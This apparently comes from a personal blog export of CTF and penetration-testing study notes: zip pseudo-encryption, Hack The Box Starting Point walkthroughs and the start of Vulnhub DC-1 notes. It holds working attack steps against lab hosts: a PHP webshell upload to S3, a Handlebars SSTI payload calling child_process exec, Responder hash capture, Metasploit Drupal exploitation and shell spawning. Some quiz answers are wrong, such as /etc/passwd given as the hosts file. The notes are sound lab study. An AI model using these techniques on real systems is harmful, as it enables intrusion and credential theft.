开始，复制到最后（因为这里只有一个zip，所以复制到最后），另存为新文件，就得到了隐藏的压缩包。\n\n\n\n2.4、改后缀名：分析知道隐藏文件是zip后，有一个简单粗暴的方法是直接把图片的后缀改为.zip，然后解压即可（这种方法虽然简单快速，但如果隐写了多个文件时可能会失败）。\n11.多图片拼图原文链接\nMisc 自动拼图需要使用python遗传算法脚本gaps和拼图脚本montage\n开始拼图以ctf中的一道训练题puzzle为例\n如果图片为碎片状，根据总数确定拼块长宽数量，并用montage进行第一次拼接\n\n#如左下角所示，总数为256块，即图片以16×16拆分而成的（要在拼块目录下运行命令），\n#*.png为拼块格式，16×16为长宽数量，flag.png为合成后的图片名\n\nmontage *.png -tile 16x16 -geometry +0+0 flag.png\n\n\n\n运行后在目录下可找到如下图片\n\n运行后在目录下可找到如下图片\n接着最关键的一点，调整图片长宽比为1：1，可以用PS-&gt;图像大小，以较大数值为边长，扩充为正方形（方便后续size的计算），否则后期gaps无法获得最佳效果\n\n\n接下来就是调用gaps脚本实现自动拼图排序（重点）\n\n#此处的size为正方形小拼块的边长像素，由于刚刚经过拉伸，拼块从160×100变成了160×160\n#注意是小的正方形像素，比如拼接完成的为360px，而一列有12张图，那size为12px\ngaps --image=flag.png --size=160 --save\n\n\n补充：gaps各参数的作用\n\n–image 指向拼图的路径\n–size 拼图块的像素尺寸\n–generations 遗传算法的代的数量\n–population 个体数量\n–verbose 每一代训练结束后展示最佳结果\n–save 将拼图还原为图像\n\n\n\n总结\n最有挑战性的地方莫过于安装gaps和对gaps参数的把握，特别是sized的计算,需要先使图片的拼块恰好为像素最大的一条边的正方形，size=该边长像素。另外，pip和python库要提前安装完毕\n\n12.zip伪加密【360压缩无视伪加密】1)zip 文件一个 ZIP 文件由三个部分组成：\n\n压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志\n\n\n\n2)伪加密原理zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。\n\n把 压缩源文件目录区 的 全局方式位标记  的 `01 00` 或 `09 00` 改为 `00 00`  就可以去除密码\n\n把 压缩源文件目录区 的 全局方式位标记  的 `00 00` 改为  `01 00` 或 `09 00`  就可以添加密码 提示\n\n\n\n3)压缩源文件数据区50 4B 03 04：这是头文件标记（0x04034b50） \n14 00：解压文件所需 pkware 版本 \n00 00：全局方式位标记（有无加密） \n08 00：压缩方式 \n5A 7E：最后修改文件时间 \nF7 46：最后修改文件日期 \n16 B5 80 14：CRC-32校验（1480B516） \n19 00 00 00：压缩后尺寸（25） \n17 00 00 00：未压缩尺寸（23） \n07 00：文件名长度 \n00 00：扩展记录长度\n\n\n\n4)压缩源文件目录区：50 4B 01 02：目录中文件文件头标记(0x02014b50) \n3F 00：压缩使用的 pkware 版本 \n14 00：解压文件所需 pkware 版本 \n00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了） \n08 00：压缩方式 \n5A 7E：最后修改文件时间 \nF7 46：最后修改文件日期 \n16 B5 80 14：CRC-32校验（1480B516） \n19 00 00 00：压缩后尺寸（25） \n17 00 00 00：未压缩尺寸（23） \n07 00：文件名长度 \n24 00：扩展字段长度 \n00 00：文件注释长度 \n00 00：磁盘开始号 \n00 00：内部文件属性 \n20 00 00 00：外部文件属性 \n00 00 00 00：局部头部偏移量 \n6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001 \n\n\n\n\n5)压缩源文件目录结束标志：50 4B 05 06：目录结束标记 \n00 00：当前磁盘编号 \n00 00：目录区开始磁盘编号 \n01 00：本磁盘上纪录总数 \n01 00：目录区中纪录总数 \n59 00 00 00：目录区尺寸大小 \n3E 00 00 00：目录区对第一张磁盘的偏移量 \n00 00：ZIP 文件注释长度\n\n\n\n\n6)查找压缩文件目录区一般面对一些小的文件时 很容易就找到  压缩文件目录区 的文件头\n\n但是当我们面对一些较大的文件 找 压缩文件目录区的 文件头  50 4B 01 02 就有点麻烦了\n\n我们可以利用 winhex 中的查找 字符查找 快速找到  压缩文件目录区  的文件头\n\n然后把 后面的 全方位标记区 的 01 00 或 09 00  改为 00 00 保存 后就可以打开压缩包了\n\n","slug":"crypto+misc","date":"2022-09-27T07:39:00.696Z","categories_index":"网络安全学习","tags_index":"crypto&misc","author_index":"Ttoc"},{"id":"f9729848a379e6b3bfbbd84e684c4e22","title":"htbのSTARTING POINT","content":"想准备试试OSCP，HACK THE BOX还行，学习一些实战知识，以及一些概念了解，部分机器根据协议，我会总结知识点，不会给出全部\n\n\nSTARTING POINT第0层*MeowTags\n\n\n\n\n\n\n\n\ntelnet\n渗透测试仪 1 级\n网络\n协议\n侦察\n弱凭证\n配置错误\n知识点\n\n\n\n\n\n\n\n\n\nVPN 启动序列输出中“隧道接口”的缩写名称：tun\n我们使用什么工具通过 ICMP 回显请求测试我们与目标的连接：ping【ping不走代理】\n用于在目标上查找开放端口的最常用工具的名称是什么？：nmap\n我们在扫描期间在端口 23&#x2F;tcp 上识别出什么服务？:telnet【远程登录】\n什么用户名能够使用空白密码通过 telnet 登录目标？: root\n\ntelnet和ssh的区别\n\n\n\n\n\n\n\n\n加密方式不同：**telnet是明码传输，SSH是加密传输**。 telnet通过TCP/IP协议簇来访问远程终端，传输的数据和口令是明文形式。 相对来说不安全，你所有的数据都可被攻击者直接捕获。 SSH相对于telnet安全，它的传输方式是以加密形式传输\n过程telnet [target_ip]\n\n\n*FawnTags\n\n\n\n\n\n\n\n\n渗透测试仪 1 级\nftp\n网络\n协议\n侦察\n匿名/访客访问\n知识点\n\n\n\n\n\n\n\n\n\n3 个字母的首字母缩略词 FTP 代表什么？: File Transfer Protocol(文件传输协议)\n\nFTP服务通常监听哪个端口？: 21\n\nFTP 的安全版本使用什么首字母缩写词？: SFTP\n\n当您想在没有帐户的情况下登录时，通过 FTP 使用的用户名是什么？: anonymous\n\n我们得到的 FTP 消息“登录成功”的响应代码是什么？:230\n\n\n用于下载我们在 FTP 服务器上找到的文件的命令是什么？:get\n\n\nFTP\n\n\n\n\n\n\n\n\n文件传输协议（File Transfer Protocol，FTP）是用于在网络上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输而不是 UDP， 客户在和服务器建立连接前要经过一个“三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。\nSFTP\n\n\n\n\n\n\n\n\nsftp是Secure File Transfer Protocol的缩写，安全文件传送协议。可以为传输文件提供一种安全的网络的加密方法。sftp 与 ftp 有着几乎一样的语法和功能。SFTP 为 SSH的其中一部分，是一种传输档案至 Blogger 伺服器的安全方式。其实在SSH软件包中，已经包含了一个叫作SFTP(Secure File Transfer Protocol)的安全文件信息传输子系统，SFTP本身没有单独的守护进程，它必须使用sshd守护进程（端口号默认是22）来完成相应的连接和答复操作，所以从某种意义上来说，SFTP并不像一个服务器程序，而更像是一个客户端程序。\nSFTP同样是使用加密传输认证信息和传输的数据，所以，使用SFTP是非常安全的。但是，由于这种传输方式使用了加密&#x2F;解密技术，所以传输效率比普通的FTP要低得多，如果您对网络安全性要求更高时，可以使用SFTP代替FTP。\n过程ftp [USER@]HOST [PORT]\n\n\n*DancingTags\n\n\n\n\n\n\n\n\n网络\n协议\nSMB\n渗透测试仪 1 级\n侦察\n匿名/访客访问\n知识点\n\n\n\n\n\n\n\n\n\n3 个字母的首字母缩略词 SMB 代表什么？:Server Message Block(服务器消息块)\nSMB 使用哪个端口进行操作？: 445\n我们可以使用 SMB 工具来“列出”共享内容的“标志”或“开关”是什么？: -L\n我们最终能够使用空白密码访问的共享名称是什么？: WorkShares\n我们可以在 SMB shell 中使用什么命令来下载我们找到的文件？: get\n\n什么是SMB\n\n\n\n\n\n\n\n\nSMB是客户端与服务器的交互协议，客户端在其中请求文件，然后服务器将文件提供给客户端。\n现在，它是一个基于Windows的网络，使用户可以创建，修改和删除网络中的共享文件，文件夹，打印机。SMB是使用TCP端口445进行通信的应用程序分层协议。\n它还提供了一种草根化的互通机制，可以在客户端和服务器之间进行传输以共享文件。随着其版本的升级，服务将得到更大的增强，并可以被用户或客户端有效使用。\nSMB如何运作\n\n\n\n\n\n\n\n\nSMB是一种请求-响应协议，这意味着它在客户端和服务器之间传输多条消息以完成请求。\nFTP, SMB, NFS的区别\n\n\n\n\n\n\n\n\n\nNFS 最好，速度快点，配置复杂点FTP 最通用，最简单SMB 不太稳定，有时候Win 会提示找不到地址\n过程 smbclient -L [target_ip]\n#列出所有可用共享\n\n\nsmbclient \\\\\\\\[target_ip]\\\\WorkShares\n#连接到 WorkShares\n\n\nRedeemerTags\n\n\n\n\n\n\n\n\nRedis\n渗透测试仪 1 级\n漏洞评估\n数据库\n侦察\n匿名/访客访问\n知识点\n\n\n\n\n\n\n\n\n\nRedis 是什么类型的数据库？:In-memory Database(内存数据库)\n哪个命令行实用程序用于与 Redis 服务器交互？输入您要在终端中输入的程序名称，不带任何参数。: redis-cli\nRedis 命令行实用程序使用哪个标志来指定主机名？: -h\n连接到Redis服务器后，使用哪个命令获取有关Redis服务器的信息和统计信息？: info\n在 Redis 中使用哪个命令来选择所需的数据库？:  select\n哪个命令用于获取数据库中的所有键？： keys *\n哪个命令用于读取键值?：get\n\n什么是Redis\n\n\n\n\n\n\n\n\nRedis (REmote DIctionary Server) 是一种开源的高级 NoSQL 键值数据存储，用作数据库、缓存和消息代理。\n数据以具有键值对的字典格式存储。数据库存储在服务器的 RAM（内存中）中以实现快速数据访问。Redis 还会以不同的时间间隔将数据库的内容写入磁盘，以在发生故障时将其作为备份持久保存。\nRedis 是一个开源的使用 ANSI C 语言编写、遵守 BSD 协议、支持网络、可基于内存、分布式、可选持久性的键值对(Key-Value)存储数据库，并提供多种语言的 API。\nRedis 通常被称为数据结构服务器，因为值（value）可以是字符串(String)、哈希(Hash)、列表(list)、集合(sets)和有序集合(sorted sets)等类型。\n什么是NoSQL\n\n\n\n\n\n\n\n\nNoSQL，泛指非关系型的数据库。\n随着互联网web2.0网站的兴起，传统的关系数据库在处理web2.0网站，特别是超大规模和高并发的SNS类型的web2.0纯动态网站已经显得力不从心，出现了很多难以克服的问题，而非关系型的数据库则由于其本身的特点得到了非常迅速的发展。\nNoSQL数据库的产生就是为了解决大规模数据集合多重数据种类带来的挑战，特别是大数据应用难题。\n过程redis-cli -h target_ip\n#连接到 redis 服务器\n\n\nkeys * \n#获取数据库中的所有键\n\n\nget flag\n#获取flag键值\n\n【动态flag，不能展示.png】\n·ExplosionTags\n\n\n\n\n\n\n\n\n网络\n编程\nRDP\n渗透测试仪 1 级\n侦察\n弱凭证\n知识点\n\n\n\n\n\n\n\n\n\n3 个字母的首字母缩略词 RDP 代表什么？：Remote Desktop Protocol（远程桌面协议）\n表示通过命令行界面与主机交互的三个字母的首字母缩写词是什么？：CLI\n那么图形用户界面交互呢？：GUI\n默认情况下未加密的旧远程访问工具的名称是什么？：telnet\n在 TCP 3389 端口上运行的服务的名称是什么？ms-wbt-server(RDP服务，默认端口3389)\n使用 xfreerdp 时用于指定目标主机 IP 地址的开关是什么？：/v:(打开工具即可查看)\n什么用户名使用空白密码成功返回桌面投影给我们？： administrator（windows用户的最高权限）\n\n什么是RDP\n\n\n\n\n\n\n\n\n远程桌面协议 ( RDP ) 是 Microsoft 开发的专有协议，它为用户提供图形界面以通过网络连接到另一台计算机。用户为此目的使用RDP客户端软件，而另一台计算机必须运行 RDP服务器软件\n什么是freerdp\n\n\n\n\n\n\n\n\nFreeRDP是一个Remote Desktop Protocol（协议）的一个实现，遵循Apache开源协议，支持3D功能，并有较高刷新率，也支持RemoteFX，H264编解码，用户管理，音频以及外设重定向等功能。\n过程xfreerdp /v:10.129.31.107 /u:administrator\n\n\nPreignitionTags\n\n\n\n\n\n\n\n\n网络\n传统应用\nApache\n渗透测试仪 1 级\n侦察\n网站结构发现\n默认凭证\n知识点\n\n\n\n\n\n\n\n\n\n目录暴力破解是一种用于检查 Web 服务器上的许多路径以查找隐藏页面的技术。另叫做？:dir busting\n\nnmap的扫描用什么switch来指定我们要进行版本检测：-sV\n\n我们使用什么开关来指定我们要专门执行 dir busting 的 Gobuster？：dir\n\n当使用 gobuster 到 dir bust 时，我们添加什么开关以确保它找到 PHP 页面？：-x php\n\n\n什么是Gobuster\n\n\n\n\n\n\n\n\nGobuster是Kali Linux默认安装的一款暴力扫描工具。 它是使用Go语言编写的命令行工具，具备优异的执行效率和并发性能。 该工具支持对子域名和Web目录进行基于字典的暴力扫描。\n过程gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.129.158.233/\n\n\n【下面是由于我用的wsl，没用vm，无法启动chrome，于是用curl传post登录数据，没有要求直接弱密码】\ncurl http://10.129.158.233/admin.php -X POST -d \"username=admin&password=adm\nin\"\n\n\n*MongodTags\n\n\n\n\n\n\n\n\nMongoDB \n渗透测试仪 1 级\n网络\n数据库\n侦察\n配置错误\n匿名/访客访问\n知识点\n\n\n\n\n\n\n\n\n\nMongoDB 是什么类型的数据库？： NoSQL\n\n与 mongodb-clients 软件包一起安装的 Mongo shell 的命令名称是什么？: mongo\n\n用于列出 MongoDB 服务器上存在的所有数据库的命令是什么？: show dbs\n\n用于列出数据库中集合的命令是什么？： show collections\n\n将名为 flag 的集合中所有文档的内容以易于阅读的格式转储的命令是什么？: db.flag.find().pretty()\n\n\n什么是MongoDB\n\n\n\n\n\n\n\n\nMongoDB是一个基于分布式文件存储 [1] 的数据库。由C++语言编写。旨在为WEB应用提供可扩展的高性能数据存储解决方案。\nMongoDB是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。它支持的数据结构非常松散，是类似json的bson格式，因此可以存储比较复杂的数据类型。Mongo最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立索引。\n过程mongo mongodb://10.129.173.130\n\n\nshow dbs\n\n\nuse sensitive_information\n\n\nshow collections\n\n\ndb.flag.find().pretty()\n\n\n*SyncedTags\n\n\n\n\n\n\n\n\nRsync\n渗透测试仪 1 级\n网络\n协议\n侦察\n匿名/访客访问\n知识点\n\n\n\n\n\n\n\n\n\nrsync 的默认端口是什么？：873\nLinux 上与 rsync 交互的最常用命令名称是什么？：rsync \n您必须向 rsync 传递哪些凭据才能使用匿名身份验证？：None(无)\n仅列出 rsync 上的共享和文件的选项是什么？（无需包括前导 – 字符）：list-only\n\n什么是rsync\n\n\n\n\n\n\n\n\nrsync是linux系统下的数据镜像备份工具。使用快速增量备份工具Remote Sync可以远程同步，支持本地复制，或者与其他SSH、rsync主机同步。\n已支持跨平台，可以在Windows与Linux间进行数据同步。\n过程rsync --list-only 10.129.33.133::\n\n\nrsync --list-only 10.129.33.133::public\n\n\nrsync 10.129.33.133::public/flag.txt flag.txt\n\nls\n\n\n第1层AppointmentTags\n\n\n\n\n\n\n\n\n网络\n数据库\n注入\nApache\nSQL\nPHP\n数据库\n渗透测试仪 1 级\n侦察\nSQL注入\n知识点\n\n\n\n\n\n\n\n\n\nSQL 的缩写代表什么？：Structured Query Language（结构化查询语言）\n最常见的 SQL 漏洞类型之一是什么？：SQL injection（SQL注入）\nPII 代表什么？：Personally Identifiable Information（个人身份信息）\n此漏洞的 2021 OWASP Top 10 分类是什么？：A03:2021-Injection\nHTTPS 协议使用的标准端口是什么？：443\nWeb 应用程序术语中的文件夹是什么？：directory\n“未找到”错误的 HTTP 响应代码是什么？：404\n如果不小心处理用户输入，它可能会被解释为评论。在不知道密码的情况下使用评论以管理员身份登录。返回的网页上的第一个词是什么？：Congratulations\n\nSequelTags\n\n\n\n\n\n\n\n\n漏洞评估\n数据库\nMySQL\nSQL\n渗透测试仪 1 级\n侦察\n弱凭证\n知识点\n\n\n\n\n\n\n\n\n\n哪个端口为 MySQL 提供服务？：3306\n使用 MySQL 命令行客户端时，我们需要使用什么开关来指定登录用户名？：-u\n在 SQL 中，我们可以使用什么符号来在查询中指定我们要显示表中的所有内容？:*\n\nCrocodileTags\n\n\n\n\n\n\n\n\n网络\n传统应用\n协议\nApache\nFTP\n渗透测试仪 1 级\n侦察\n网站结构发现\n明文凭证\n匿名/访客访问\n知识点\n\n\n\n\n\n\n\n\n\n什么 Nmap 扫描开关在扫描期间使用默认脚本？：-sC\n“允许匿名 FTP 登录”消息返回给我们的 FTP 代码是什么？：230\n使用 ftp 客户端连接到 FTP 服务器后，当提示匿名登录时，我们提供什么用户名？：anonymous\n匿名连接到FTP服务器后，我们可以使用什么命令来下载我们在FTP服务器上找到的文件呢？：get\n我们可以使用 Gobuster 的什么开关来指定我们正在寻找特定的文件类型：-x\n\n过程ftp 10.129.33.176\n\n\n\n扫描找到登录页面\ndirsearch -u 10.129.33.176\n\n\n然后抓包字典爆破得到账号密码，登录得到flag\n\nResponderTags\n\n\n\n\n\n\n\n\nWinRM\n网络\n传统应用\n协议\nXAMPP\nSMB\nResponder\nPHP\n渗透测试仪 1 级\n侦察\n密码破解\n哈希捕获\n远程文件包含\n远程代码执行\n知识点\n\n\n\n\n\n\n\n\n\n用于加载网页不同语言版本的 URL 参数的名称是什么？:page\npage 参数的以下哪些值是利用本地文件包含 (LFI) 漏洞的示例:../../../../../../../../windows/system32/drivers/etc/hosts\npage 参数的以下哪些值是利用远程文件包含 (RFI) 漏洞的示例：//10.10.14.6/somefile\nNTLM 代表什么？:New Technology LAN Manager\n在 Responder 实用程序中使用哪个标志来指定网络接口？：-i\n有几种工具可以接受 NetNTLMv2 质询&#x2F;响应并尝试数百万个密码以查看其中是否有任何一个生成相同的响应。一种这样的工具通常被称为 john，但全名是什么？：John the Ripper\n\n什么是smb？\n\n\n\n\n\n\n\n\nSMB(全称是Server Message Block)是一个网络协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。\n什么是WinRM？\n\n\n\n\n\n\n\n\nWinRM（Windows 远程管理，Windows Remote Management）是WEB服务管理于微软的Microsoft Windows中的实现，它允许处于一个共同网络内的Microsoft Windows计算机彼此之间互相访问和交换信息。在一台机器启用WinRM后，另一台机器就能通过Windows PowerShell对开启WinRM的机器进行远程管理\n什么是XAMPP？\n\n\n\n\n\n\n\n\nXAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。这个软件包原来的名字是 LAMPP，但是为了避免误解，最新的几个版本就改名为 XAMPP 了。它可以在Windows、Linux、Solaris、[Mac OS X](https://baike.baidu.com/item/Mac OS X&#x2F;470629) 等多种操作系统下安装使用，支持多语言：英文、简体中文、繁体中文、韩文、俄文、日文等。\n什么是NTLM？\n\n\n\n\n\n\n\n\nNTLM是Windows 新技术 LAN 管理器(NTLM) 是 Microsoft 提供的一套安全协议，用于验证用户身份并保护其活动的完整性和机密性。\n指telnet 的一种验证身份方式，即问询&#x2F;应答身份验证协议，是Windows NT 早期版本的标准安全协议，Windows 2000 支持NTLM 是为了保持向后兼容。 Windows 2000内置三种基本安全协议之一。\n什么是Responder？\n\n\n\n\n\n\n\n\nResponder就是这样一种利用身份认证协议，监听获取口令哈希的工具。 如果客户端&#x2F;目标无法通过DNS域名解析，则会回退到LLMNR（在Windows Vista中引入）和NBT-NS进行解析。 LLMNR（链路本地多播名称解析）：多播方式查找网络上的主机，其它主机响应IP，然后连接。\n什么是evil-winrm？\n\n\n\n\n\n\n\n\nevil-winrm是Windows远程管理(WinRM) Shell的终极版本。 Windows远程管理是“WS 管理协议的Microsoft 实施，该协议是基于标准SOAP、不受防火墙影响的协议，允许不同供应商的硬件和操作系统相互操作。\n过程启动responder并指定监听本地的tun0网卡，\n然后由于靶机存在RFI，因此可以远程访问本地的某个文件，使用responder拿到主机的administrator的哈希，然后使用john破解。\nresponder -I tun0\n\n\n\n\n\n\n\n\n\n\n\n访问http://unika.htb/index.php?page=//10.10.16.28/somefile\n[需要先修改hosts文件，把重定向ip修改到对应域名]\n这里ip为本地tun0网卡ip\n\n\njohn -t hash.txt\n\n得到密码\nevil-winrm登录\nevil-winrm -i 10.129.198.112 -u Administrator -p badminton\n\n\nflag在mike用户的Desktop目录中\nThreeTags\n\n\n\n\n\n\n\n\n网络\nCloud\n传统应用\nAWS\n渗透测试仪 1 级\n侦察\n网站结构发现\n桶枚举\n任意文件上传\n匿名/访客访问\n知识点\n\n\n\n\n\n\n\n\n\n哪个命令行实用程序可用于与在已发现的子域上运行的服务进行交互？：awscli\n哪个命令用于设置 AWS CLI 安装？：aws configure\n上述实用程序用于列出所有 S3 存储桶的命令是什么？：aws s3 ls\n\n什么是aws？\n\n\n\n\n\n\n\n\n亚马逊AWS（Amazon Web Services (AWS) ）是亚马逊提供的是全球最全面、应用最广泛的云平台，从全球数据中心提供超过 200 项功能齐全的服务。数百万客户(包括增长最快速的初创公司、最大型企业和主要的政府机构)都在使用 AWS 来降低成本、提高敏捷性并加速创新。\n什么是awscli？\n\n\n\n\n\n\n\n\nAWS 命令行界面（AWS CLI）是用于管理AWS 产品的统一工具。 只需要下载和配置一个工具，您就可以使用命令行控制多个AWS 产品并利用脚本来自动执行这些服务\n什么是 Amazon S3？\n\n\n\n\n\n\n\n\nAmazon Simple Storage Service（Amazon S3）是一种对象存储服务，提供行业领先的可扩展性、数据可用性、安全性和性能。各种规模和行业的客户都可以使用 Amazon S3 存储和保护任意数量的数据，用于数据湖、网站、移动应用程序、备份和恢复、归档、企业应用程序、IoT 设备和大数据分析。Amazon S3 提供了管理功能，使您可以优化、组织和配置对数据的访问，以满足您的特定业务、组织和合规性要求。\n什么是Bucket Enumeration(存储桶枚举)？\n\n\n\n\n\n\n\n\nS3 存储桶枚举是查询 S3 存储桶和这些存储桶中的对象的过程。这可以使用不同的 AWS API 调用来完成，例如列出存储桶、获取存储桶内容或 ListObjects。此过程旨在确定给定存储桶中存在哪些 S3 对象。您可以使用此信息来帮助您更好地了解您的数据资源，并就如何最好地管理它做出决定。\n过程gobuster爆破子域名\ngobuster vhost -w /usr/share/wordlists/subdomains-top1million-5000.txt -u http://thetoppers.htb\n\n列出该s3存储桶下的内容\naws s3 ls --endpoint=http://s3.thetoppers.htb/ s3://thetoppers.htb\n\n\n本地写一个一句话木马脚本\necho &#x27;&#x27; > shell.php\n\n上传本地一句话木马到s3存储桶\naws s3 cp shell.php --endpoint=http://s3.thetoppers.htb/ s3://thetoppers.htb\n\n\n访问看看是否成功\ncurl http://thetoppers.htb/shell.php?cmd=ls\n\n\n然后蚁剑连接也行，但htb的vpn不走主机连不上\n所以可以利用nc反弹shell，也可以直接利用脚本在进行命令执行读取flag\n\nIgnitionTags\n\n\n\n\n\n\n\n\nweb\n常见应用\nMagento\n渗透测试员 1 级\n侦察\n网站结构发现\n弱凭据\n知识点\n\n\n\n\n\n\n\n\n\nLinux 计算机上保存域名到 IP 地址对的本地列表的文件的完整路径是什么？:/etc/passwd\n查找Magento的密码要求，并尝试搜索2023年最常见的密码。哪个密码可以访问管理员帐户？:qwerty123\n\nMagento是什么\n\n\n\n\n\n\n\n\nMagento是Adobe公司旗下一个功能丰富的专业开源电子商务解决方案，为商家提供一个外观、内容和功能的完全灵活控制。Magento直观的管理界面包含强大的营销、商品推销和内容管理工具，使商家能够创建适合其独特业务需求的站点。Magento号称宇宙最强企业终极电子商务解决方案\n2023年排名前十的密码\n\n\n\n\n\n\n\n\n\n123456\n123456789\nqwerty\npassword\n12345\nqwerty123\n1q2w3e\n12345678\n111111\n1234567890\n\n*BikeTags\n\n\n\n\n\n\n\n\nJavascript\nWeb\nInjection\nCustom Applications\nNodeJS\nPenetration Tester Level 1\n侦察\n远程代码执行\n服务器端模板注入 （SSTI）\n知识点\n\n\n\n\n\n\n\n\n\nNode.JS 中使用的模板引擎是什么？:handlebars\n\n为了在 HTTP 请求中发送有效负载中的特殊字符，我们将对有效负载进行编码。我们使用什么类型的编码？:URL\n\n当我们使用来自 HackTricks 的有效负载来尝试运行系统命令时，我们会收到错误。响应错误中的“未定义”是什么？:require\n\nNode.JS 中顶级作用域的名称是什么变量？:Global\n\n通过利用此漏洞，我们以运行 Web 服务器的用户身份执行命令。该用户的名称是什么？:root\n\n\n过程先在HackTricks查看handlebars模板引擎注入payload模板\n&#123;&#123;#with \"s\" as |string|&#125;&#125;\n  &#123;&#123;#with \"e\"&#125;&#125;\n    &#123;&#123;#with split as |conslist|&#125;&#125;\n      &#123;&#123;this.pop&#125;&#125;\n      &#123;&#123;this.push (lookup string.sub \"constructor\")&#125;&#125;\n      &#123;&#123;this.pop&#125;&#125;\n      &#123;&#123;#with string.split as |codelist|&#125;&#125;\n        &#123;&#123;this.pop&#125;&#125;\n        &#123;&#123;this.push \"return require(&#x27;child_process&#x27;).exec(&#x27;whoami&#x27;);\"&#125;&#125;\n        &#123;&#123;this.pop&#125;&#125;\n        &#123;&#123;#each conslist&#125;&#125;\n          &#123;&#123;#with (string.sub.apply 0 codelist)&#125;&#125;\n            &#123;&#123;this&#125;&#125;\n          &#123;&#123;/with&#125;&#125;\n        &#123;&#123;/each&#125;&#125;\n      &#123;&#123;/with&#125;&#125;\n    &#123;&#123;/with&#125;&#125;\n  &#123;&#123;/with&#125;&#125;\n&#123;&#123;/with&#125;&#125;\n\n关键代码为\n&#123;&#123;this.push \"return require(&#x27;child_process&#x27;).exec(&#x27;whoami&#x27;);\"&#125;&#125;\n\nURL编码这是关键，因为只有对特殊字符编码后，网站才能正常识别\n修改payload如果直接使用这个模板payload会发生报错\n概念Process.MainModule 属性\n\n\n\n\n\n\n\n\n获取关联进程的主模块\nchild_process模块\n\n\n\n\n\n\n\n\nchild_process模块充当 spawn、exec、execFile 和 fork 函数的命名空间。 \n调用以引用模块，然后调用其成员函数之一以创建新进程。\n就是在当前主进程开一个子进程用于shell命令执行\n第2层","slug":"htb(STARTING-POINT)","date":"2022-09-23T03:02:10.905Z","categories_index":"Hack the Box","tags_index":"htb","author_index":"Ttoc"},{"id":"491300d0cef38ffb8ad393b16508579e","title":"Vulnhub靶场学习笔记","content":"学习一下实战靶场，做一下笔记\n实战环境，\n信息收集的能力决定了能否渗透成功，以及自己会浪费自己多少时间\n\n\n前言官网下载地址\n\n\n\n\n\n\n\n\n\nhttp://www.vulnhub.com/\n这里提一下靶场机ip怎么看\nip a\n\n\n\n\n\n\n\n\n\n\n\nnmap -sP  192.168.133.134/24&#x2F;&#x2F;192.168.133.134是虚拟机ip\n\n找到靶机ip\n192.168.133.136\n\n习惯性用nmap扫一下它端口\n\n\nDC系列【1~9】(完)一、DC-1[初级]five flags\n信息收集浏览器访问靶机ip\n192.168.133.136\n\n这是开始界面\n\n这里介绍一个插件Wappalyzer，它能够获取网页自身的框架和编写的语言，这样就不用查看网络返回包来分析了\n\n可以看到网站是用php语言编写的，CMS是Drupal\n\nFlag1msf先用msf看看有没有drupal相应的攻击脚本\n\n\n\n\n\n\n\n\n\n终端输入msfconsole，进入msf界面，或者菜单也可以打开\n\n\n\n\n\n\n\n\n\n\n输入search drupal，找一下有没有drupal可以利用的脚本对于其他命令，可以用help查询\n\n这里可以选择不同的脚本，下面以编号1的脚本为例，其他的应该也可以\n\n\n\n\n\n\n\n\n\n输入use 1，进入编号1脚本的运行环境\n\n\n\n\n\n\n\n\n\n\n输入show options,查看脚本运行的所需要配置的项目\n\n\n\n\n\n\n\n\n\n\nRequired是要求填的，yes是必填项，no是非必填项\n这里的RHOSTS没有填，这里是要求填入target hosts也就是目标地址，也就是我们靶机的地址\n\n\n\n\n\n\n\n\n\n输入set RHOSTS 192.168.133.136\n\n\n\n\n\n\n\n\n\n\n再输入run，运行脚本\n\n\n\n\n\n\n\n\n\n\n输入shell，进入shell\n\n\n\n\n\n\n\n\n\n\n输入whoami，查看当前的权限\n\n发现是个低权限的账号\n\n\n\n\n\n\n\n\n\n输入ls，可以查看到当前的目录文件\n\n但是一堆东西挤在一起，还是有些不太方便\n*交互式shell输入下方指令，利用python进入交互式shell【固定姿势，要记住】\npython -c &#x27;import pty; pty.spawn(\"/bin/bash\")&#x27;\n\n\n\n\n\n\n\n\n\n\n\n输入ls\n\n发现flag1.txt\n\n\n\n\n\n\n\n\n\n输入cat flag1.txt查看\n\n\n\n\n\n\n\n\n\n\nEvery good CMS needs a config file - and so do you.意思是：一个好的CMS（内容管理系统）需要一个config file（配置文件）\n也就是我们需要看看它的配置文件，这是Flag2的线索\nFlag2在目录下我们发现有个sites目录，也就是站点目录，里面很有可能有配置文件\n\n\n\n\n\n\n\n\n\n\n输入cd sites;ls -a\n\n有个default（默认）目录，查看一下\n\n\n\n\n\n\n\n\n\n输入cd default;ls -a\n\n看到setting.php也就差不多是config file\n\n\n\n\n\n\n\n\n\n输入cat setting.php\n\n得到Flag2\n\n\n\n\n\n\n\n\n\n\nflag2\n\nBrute force and dictionary attacks aren&#39;t the\n\nonly ways to gain access (and you WILL need access).\n\nWhat can you do with these credentials?\n 意思是：暴力和字典攻击不是获得访问权限的唯一方法（您将需要访问权限）。 你能用这些证书做什么？\n\n\n就是说不要局限于爆破密码来登录admin用户，你拥有了数据库这些信息，你可以做什么\n\nFlag3关键分析这里，这是靶机数据库的用户名和密码的信息，\n有了这个我们就可以进入靶机的数据库，对里面的数据库进行修改或增添\narray (\n     &#x27;database&#x27; => &#x27;drupaldb&#x27;,\n     &#x27;username&#x27; => &#x27;dbuser&#x27;,\n     &#x27;password&#x27; => &#x27;R0ck3t&#x27;,\n     &#x27;host&#x27; => &#x27;localhost&#x27;,\n     &#x27;port&#x27; => &#x27;&#x27;,\n     &#x27;driver&#x27; => &#x27;mysql&#x27;,\n     &#x27;prefix&#x27; => &#x27;&#x27;,\n   )\n\n1）mysql数据库修改admin用户的密码（或者新建一个用户密码）\n\n\n\n\n\n\n\n\n输入mysql -udbuser 